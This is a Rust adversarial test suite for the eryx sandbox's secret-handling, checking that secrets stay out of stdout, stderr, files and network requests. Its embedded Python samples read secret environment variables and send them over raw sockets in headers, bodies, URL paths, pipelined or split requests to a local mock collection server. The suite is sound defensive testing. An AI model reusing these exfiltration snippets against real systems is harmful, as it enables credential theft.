//! Adversarial security tests for secrets exfiltration.
//!
//! These tests simulate a malicious actor inside the sandbox trying to
//! exfiltrate secrets through every available channel: network, filesystem,
//! stdout/stderr, error messages, encoding tricks, and more.
//!
//! Threat model: Python code knows it's in an eryx sandbox with secrets,
//! and actively tries to extract or leak the real secret values.

#![cfg(feature = "embedded")]
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::Arc;

use tokio::sync::Mutex;

use eryx::{NetConfig, Sandbox};

// =============================================================================
// Test Helpers
// =============================================================================

/// Mock HTTP server that records all received request data verbatim.
struct ExfilServer {
    received: Arc<Mutex<Vec<Vec<u8>>>>,
}

impl ExfilServer {
    fn new() -> Self {
        Self {
            received: Arc::new(Mutex::new(Vec::new())),
        }
    }

    async fn start(&self, port: u16) -> tokio::task::JoinHandle<()> {
        let received = self.received.clone();
        let listener = tokio::net::TcpListener::bind(format!("127.0.0.1:{port}"))
            .await
            .expect("Failed to bind exfil server");

        tokio::spawn(async move {
            loop {
                if let Ok((mut socket, _)) = listener.accept().await {
                    let received = received.clone();
                    tokio::spawn(async move {
                        use tokio::io::{AsyncReadExt, AsyncWriteExt};
                        let mut buf = vec![0u8; 65536];
                        if let Ok(n) = socket.read(&mut buf).await {
                            buf.truncate(n);
                            received.lock().await.push(buf);

                            let response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                            let _ = socket.write_all(response).await;
                        }
                    });
                }
            }
        })
    }

    /// Check if any received data contains the given bytes.
    async fn received_contains(&self, needle: &[u8]) -> bool {
        let data = self.received.lock().await;
        data.iter().any(|d| contains_bytes(d, needle))
    }
}

fn contains_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() {
        return false;
    }
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

const REAL_SECRET: &str = "sk-SUPER-SECRET-KEY-do-not-leak-12345";

// =============================================================================
// 1. Stdout Exfiltration Attempts
// =============================================================================

/// Attacker prints the secret value directly to stdout.
#[tokio::test]
async fn test_exfil_stdout_direct_print() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os
key = os.environ.get("API_KEY", "")
print(key)
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must never appear in stdout"
    );
    assert!(
        !result.stdout.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from stdout"
    );
    assert!(
        result.stdout.contains("[REDACTED]"),
        "Scrubbed value should show [REDACTED]"
    );
}

/// Attacker prints secret to stderr.
#[tokio::test]
async fn test_exfil_stderr_direct() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, sys
key = os.environ.get("API_KEY", "")
sys.stderr.write(key + "\n")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stderr.contains(REAL_SECRET),
        "Real secret must never appear in stderr"
    );
    assert!(
        !result.stderr.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from stderr"
    );
}

/// Attacker prints the secret character-by-character to try to evade pattern matching.
#[tokio::test]
async fn test_exfil_stdout_char_by_char() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os
key = os.environ.get("API_KEY", "")
for c in key:
    print(c, end='')
print()
"#,
        )
        .await
        .unwrap();

    // The placeholder is still assembled as a full string in Python's output buffer,
    // so scrubbing should catch it. Verify real secret is absent regardless.
    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear in stdout even with char-by-char printing"
    );
}

/// Attacker tries to encode the secret in base64/hex to bypass scrubbing.
/// Since Python only has the placeholder, encoding it just encodes the placeholder.
/// The key insight: the REAL secret is never in the sandbox, so encoding tricks
/// can only encode the placeholder value.
#[tokio::test]
async fn test_exfil_stdout_encoded() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, base64
key = os.environ.get("API_KEY", "")

# Encode the placeholder (Python doesn't have the real secret)
encoded_b64 = base64.b64encode(key.encode()).decode()
print(f"B64: {encoded_b64}")

encoded_hex = key.encode().hex()
print(f"HEX: {encoded_hex}")

reversed_key = key[::-1]
print(f"REV: {reversed_key}")
"#,
        )
        .await
        .unwrap();

    // The real secret is never in the sandbox, so encoding tricks are moot
    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear in stdout even when encoded"
    );
}

/// Verify the sandbox never has the real secret value — only the placeholder.
#[tokio::test]
async fn test_sandbox_never_has_real_secret() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os
key = os.environ.get("API_KEY", "")

# The value should be a placeholder, NOT the real secret
is_placeholder = key.startswith("ERYX_SECRET_PLACEHOLDER_")
print(f"IS_PLACEHOLDER: {is_placeholder}")
# Check the real secret prefix is NOT present
has_real = "sk-SUPER" in key
print(f"HAS_REAL_PREFIX: {has_real}")
"#,
        )
        .await
        .unwrap();

    assert!(
        result.stdout.contains("HAS_REAL_PREFIX: False"),
        "Real secret prefix must NOT be in the sandbox environment variable"
    );
}

// =============================================================================
// 2. Network Exfiltration (TCP) — Secret in HTTP Header to Unauthorized Host
// =============================================================================

/// Attacker sends a host-restricted secret to an evil server via HTTP header.
/// The secret should NOT be substituted because the host is unauthorized.
#[tokio::test]
async fn test_exfil_network_unauthorized_host_via_header() {
    let server = ExfilServer::new();
    let _handle = server.start(19101).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret(
            "API_KEY",
            REAL_SECRET,
            vec!["api.legitimate.com".to_string()],
        )
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 19101))
    request = f"POST /exfil HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Stolen: {key}\r\nContent-Length: 0\r\n\r\n"
    sock.send(request.encode())
    response = sock.recv(4096)
    sock.close()
    print("RESULT: sent")
except Exception as e:
    print(f"RESULT: blocked: {e}")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NEVER reach an unauthorized host via HTTP headers"
    );
}

/// Attacker puts the secret in the HTTP request body (not headers).
/// Body substitution is not implemented, so only the placeholder can leak,
/// never the real secret.
#[tokio::test]
async fn test_exfil_network_secret_in_body() {
    let server = ExfilServer::new();
    let _handle = server.start(19102).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec!["127.0.0.1".to_string()])
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19102))

body = f"stolen_key={key}"
request = f"POST /exfil HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: {len(body)}\r\n\r\n{body}"
sock.send(request.encode())
response = sock.recv(4096)
sock.close()
print("BODY_EXFIL: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT be sent in HTTP request body"
    );
}

/// Attacker smuggles the secret in the URL path of the request line.
/// The request line is not a header, so substitution should not apply.
#[tokio::test]
async fn test_exfil_network_secret_in_url_path() {
    let server = ExfilServer::new();
    let _handle = server.start(19103).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec!["127.0.0.1".to_string()])
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19103))

# Put the secret in the URL path, not a header
request = f"GET /exfil/{key} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
sock.send(request.encode())
response = sock.recv(4096)
sock.close()
print("URL_EXFIL: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT be sent in URL path"
    );
}

/// Attacker uses a non-HTTP protocol to bypass HTTP parsing entirely.
/// Raw TCP with non-HTTP data should pass through without substitution.
#[tokio::test]
async fn test_exfil_network_raw_non_http_protocol() {
    let server = ExfilServer::new();
    let _handle = server.start(19104).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec!["127.0.0.1".to_string()])
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19104))

# Send raw non-HTTP data to bypass the HTTP parser
raw_data = f"CUSTOM_PROTOCOL|{key}|END\r\n\r\n"
sock.send(raw_data.encode())
response = sock.recv(4096)
sock.close()
print("RAW_EXFIL: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // Non-HTTP data bypasses HTTP parsing — only the placeholder can leak, never the real secret
    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT be sent via raw TCP (non-HTTP protocol)"
    );
}

/// Attacker splits the HTTP request across multiple TCP writes to confuse the parser.
#[tokio::test]
async fn test_exfil_network_split_tcp_writes() {
    let server = ExfilServer::new();
    let _handle = server.start(19105).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec!["127.0.0.1".to_string()])
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket, time

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19105))

# Split the request across multiple sends
part1 = f"GET /test HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: "
sock.send(part1.encode())
time.sleep(0.01)

part2 = f"{key}\r\n\r\n"
sock.send(part2.encode())

response = sock.recv(4096)
sock.close()
print("SPLIT_EXFIL: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT leak via split TCP writes"
    );
}

/// Attacker makes two requests on same connection (HTTP pipelining).
/// Second request tries to send the secret to a different conceptual "host".
#[tokio::test]
async fn test_exfil_network_http_pipelining() {
    let server = ExfilServer::new();
    let _handle = server.start(19106).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret(
            "API_KEY",
            REAL_SECRET,
            vec!["api.legitimate.com".to_string()],
        )
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19106))

# Send two pipelined requests:
# 1. Innocent request
# 2. Exfiltration attempt with the secret
request1 = "GET /innocent HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
request2 = f"GET /exfil HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Stolen: {key}\r\n\r\n"
sock.send((request1 + request2).encode())

response = sock.recv(4096)
sock.close()
print("PIPELINE_EXFIL: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT leak via HTTP pipelining to unauthorized host"
    );
}

// =============================================================================
// 3. Environment Variable Enumeration & Introspection
// =============================================================================

/// Attacker enumerates all env vars to discover and print secret placeholders.
#[tokio::test]
async fn test_exfil_enumerate_env_vars() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os

for key, val in os.environ.items():
    if "SECRET" in key or "ERYX" in val or "PLACEHOLDER" in val:
        print(f"FOUND: {key}={val}")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear when enumerating env vars"
    );
    assert!(
        !result.stdout.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from env var enumeration output"
    );
}

/// Attacker uses Python introspection (inspect/frame) to find preamble source.
#[tokio::test]
async fn test_exfil_introspect_preamble_via_frames() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import sys

try:
    frame = sys._getframe(0)
    # Try to find placeholder in globals
    for k, v in frame.f_globals.items():
        if isinstance(v, str) and ("ERYX" in v or "PLACEHOLDER" in v):
            print(f"GLOBAL_LEAK: {k}={v}")
    # Try to get source code
    code = frame.f_code
    print(f"FILENAME: {code.co_filename}")
    # Try co_consts which might contain string literals from preamble
    for const in code.co_consts:
        if isinstance(const, str) and "ERYX" in const:
            print(f"CONST_LEAK: {const}")
except Exception as e:
    print(f"INTROSPECT: {e}")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not be discoverable via frame introspection"
    );
    assert!(
        !result.stdout.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from introspection output"
    );
}

/// Attacker raises an exception that includes the secret in the traceback.
#[tokio::test]
async fn test_exfil_via_exception_traceback() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, traceback

key = os.environ.get("SECRET_KEY", "")

try:
    raise ValueError(f"Error processing key: {key}")
except Exception:
    tb = traceback.format_exc()
    print(f"TRACEBACK: {tb}")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear in exception tracebacks"
    );
    assert!(
        !result.stdout.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from traceback output"
    );
}

/// Attacker writes secret to stderr via sys.stderr.
#[tokio::test]
async fn test_exfil_stderr_via_syswrite() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, sys
key = os.environ.get("SECRET_KEY", "")
sys.stderr.write(f"ERROR: Auth failed with {key}\n")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stderr.contains(REAL_SECRET),
        "Real secret must not appear in stderr"
    );
    assert!(
        !result.stderr.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed from stderr"
    );
}

// =============================================================================
// 4. File System Exfiltration (VFS)
// =============================================================================

/// Attacker writes the secret to a file and reads it back.
/// Tests that file scrubbing (when active) prevents this.
#[tokio::test]
async fn test_exfil_write_secret_to_file() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os

key = os.environ.get("SECRET_KEY", "")

# Try to write the secret to a file
try:
    with open("/tmp/exfil.txt", "w") as f:
        f.write(key)
    # Read it back
    with open("/tmp/exfil.txt", "r") as f:
        content = f.read()
    print(f"FILE_CONTENT: {content}")
except Exception as e:
    print(f"FILE_ERROR: {e}")
"#,
        )
        .await
        .unwrap();

    // The real secret should never be in the output
    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear in file read-back output"
    );
}

// =============================================================================
// 5. Timing & Side Channel Attacks
// =============================================================================

/// Attacker tries to determine placeholder length (which could help identify format).
/// This isn't a direct leak but could help a sophisticated attack.
#[tokio::test]
async fn test_exfil_timing_placeholder_length() {
    let sandbox = Sandbox::embedded()
        .with_secret("SECRET_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os
key = os.environ.get("SECRET_KEY", "")
# Print the length, which reveals it's a placeholder (fixed format)
# This is informational — the length of a placeholder isn't sensitive
print(f"LENGTH: {len(key)}")
"#,
        )
        .await
        .unwrap();

    // The length itself isn't the real secret, and this is acceptable.
    // But verify the actual secret isn't leaked.
    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not appear even when probing length"
    );
}

// =============================================================================
// 6. Multiple Secrets with Cross-Host Confusion
// =============================================================================

/// Attacker has access to multiple secrets with different host restrictions.
/// Tries to send Secret A to Host B's server.
#[tokio::test]
async fn test_exfil_cross_secret_host_confusion() {
    let server = ExfilServer::new();
    let _handle = server.start(19107).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret(
            "OPENAI_KEY",
            "openai-real-secret-value",
            vec!["api.openai.com".to_string()],
        )
        .with_secret(
            "GITHUB_KEY",
            "github-real-secret-value",
            vec!["api.github.com".to_string()],
        )
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

openai_key = os.environ.get("OPENAI_KEY", "")
github_key = os.environ.get("GITHUB_KEY", "")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 19107))

    # Try to send BOTH secrets to our evil server
    request = f"POST /steal HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    request += f"X-OpenAI: {openai_key}\r\n"
    request += f"X-GitHub: {github_key}\r\n"
    request += "Content-Length: 0\r\n\r\n"
    sock.send(request.encode())
    response = sock.recv(4096)
    sock.close()
    print("CROSS_EXFIL: sent")
except Exception as e:
    print(f"CROSS_EXFIL: error: {e}")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // Neither real secret should reach the evil server
    assert!(
        !server.received_contains(b"openai-real-secret-value").await,
        "OpenAI secret must NOT reach unauthorized server"
    );
    assert!(
        !server.received_contains(b"github-real-secret-value").await,
        "GitHub secret must NOT reach unauthorized server"
    );
}

// =============================================================================
// 7. DNS Rebinding / Host Header Confusion
// =============================================================================

/// Attacker sends a request with a spoofed Host header, trying to trick
/// the system into thinking the connection is to a different host.
/// The host check should be based on the TCP connection target, not the Host header.
#[tokio::test]
async fn test_exfil_spoofed_host_header() {
    let server = ExfilServer::new();
    let _handle = server.start(19108).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret(
            "API_KEY",
            REAL_SECRET,
            vec!["api.legitimate.com".to_string()],
        )
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

try:
    # Connect to evil server at localhost
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 19108))

    # But set Host header to the legitimate host to try to trick substitution
    request = f"GET /api HTTP/1.1\r\n"
    request += "Host: api.legitimate.com\r\n"  # Spoofed!
    request += f"Authorization: Bearer {key}\r\n"
    request += "\r\n"
    sock.send(request.encode())
    response = sock.recv(4096)
    sock.close()
    print("SPOOFED_HOST: sent")
except Exception as e:
    print(f"SPOOFED_HOST: error: {e}")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // The host check should use the TCP connection target (127.0.0.1),
    // NOT the Host header. So the secret should NOT be substituted.
    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT leak via spoofed Host header — host check must use TCP target, not HTTP Host header"
    );
}

// =============================================================================
// 8. Connection Reuse / Handle Reuse Attacks
// =============================================================================

/// Attacker tries to confuse the system by rapidly opening and closing connections.
#[tokio::test]
async fn test_exfil_rapid_connection_cycling() {
    let server = ExfilServer::new();
    let _handle = server.start(19109).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret(
            "API_KEY",
            REAL_SECRET,
            vec!["api.legitimate.com".to_string()],
        )
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

# Rapidly open and close many connections to try to confuse handle tracking
for i in range(5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", 19109))
        request = f"GET /attempt-{i} HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: {key}\r\n\r\n"
        sock.send(request.encode())
        sock.close()
    except:
        pass

print("RAPID_CYCLE: done")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(500)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT leak via rapid connection cycling"
    );
}

// =============================================================================
// 9. Encoding Smuggling Attacks
// =============================================================================

/// Attacker tries to fragment the placeholder across HTTP header boundaries
/// by using header continuation (obsolete in HTTP/1.1 but some servers accept it).
#[tokio::test]
async fn test_exfil_header_continuation_smuggling() {
    let server = ExfilServer::new();
    let _handle = server.start(19110).await;
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec!["127.0.0.1".to_string()])
        .with_network(NetConfig::permissive())
        .scrub_stdout(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os, socket

key = os.environ.get("API_KEY", "")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 19110))

# Try to split the key across a header continuation line
# (obs-fold in HTTP/1.1: LWS on next line continues the header)
mid = len(key) // 2
request = f"GET /test HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Key: {key[:mid]}\r\n {key[mid:]}\r\n\r\n"
sock.send(request.encode())
response = sock.recv(4096)
sock.close()
print("HEADER_CONT: sent")
"#,
        )
        .await
        .unwrap();

    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    assert!(
        !server.received_contains(REAL_SECRET.as_bytes()).await,
        "Real secret must NOT leak via header continuation smuggling"
    );
}

// =============================================================================
// 10. Null Byte / Special Character Attacks
// =============================================================================

/// Attacker tries to inject null bytes or special characters to confuse scrubbing.
#[tokio::test]
async fn test_exfil_null_byte_injection() {
    let sandbox = Sandbox::embedded()
        .with_secret("API_KEY", REAL_SECRET, vec![])
        .scrub_stdout(true)
        .scrub_stderr(true)
        .build()
        .unwrap();

    let result = sandbox
        .execute(
            r#"
import os

key = os.environ.get("API_KEY", "")

# Try to inject null bytes around the placeholder to break scrubbing
print(f"BEFORE\x00{key}\x00AFTER")

# Try to use Unicode confusables
print(f"KEY={key}")
"#,
        )
        .await
        .unwrap();

    assert!(
        !result.stdout.contains(REAL_SECRET),
        "Real secret must not leak via null byte injection"
    );
    assert!(
        !result.stdout.contains("ERYX_SECRET_PLACEHOLDER_"),
        "Placeholder must be scrubbed even with null byte injection attempts"
    );
}
